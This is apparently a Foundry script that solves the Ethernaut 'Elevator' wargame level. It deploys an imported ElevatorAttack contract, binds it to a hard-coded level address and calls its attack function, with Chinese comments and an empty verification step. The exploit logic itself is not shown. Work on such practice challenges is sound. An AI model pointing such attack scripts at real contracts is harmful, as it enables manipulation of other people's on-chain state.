// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ElevatorAttack} from "../src/ElevatorAttack.sol";

interface IElevatorView {
    function top() external view returns (bool);
}

contract ElevatorAttackScript is Script {
    function run() external {
        address elevatorLevel = 0x0FbCE652ce13DAa135aBafA3b585584E35B9D787;

        vm.startBroadcast();

        // 部署攻击合约
        ElevatorAttack attacker = new ElevatorAttack();

        // 绑定 Ethernaut 实例
        attacker.setElevator(elevatorLevel);

        // 执行攻击
        attacker.attack();

        vm.stopBroadcast();

        // 验证 top 是否被设为 true

    }
}
